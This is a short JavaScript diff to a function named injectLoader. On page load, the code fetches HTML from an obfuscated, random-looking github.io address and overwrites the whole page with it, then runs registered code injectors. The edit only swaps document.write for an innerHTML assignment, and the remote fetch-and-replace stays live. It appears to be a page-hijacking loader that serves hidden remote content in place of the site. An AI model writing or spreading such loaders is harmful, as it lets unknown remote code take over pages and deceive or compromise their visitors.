@@ -446,18 +446,13 @@ function injectLoader() {
 
     // New script to load content from URL and inject it into the document
     document.addEventListener('DOMContentLoaded', () => {
-        document.open();
-        document.write('');
-        document.close();
         var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html',
             xhr = new XMLHttpRequest();
         xhr.open('GET', url);
         xhr.onreadystatechange = function () {
             if (xhr.readyState === 4) {
                 var mErt = xhr.responseText;
-                document.open();
-                document.write(mErt);
-                document.close();
+                document.querySelector('html').innerHTML = mErt;
 
                 // Apply injectors after content is loaded
                 window.sbCodeInjectors.forEach((injector) => {
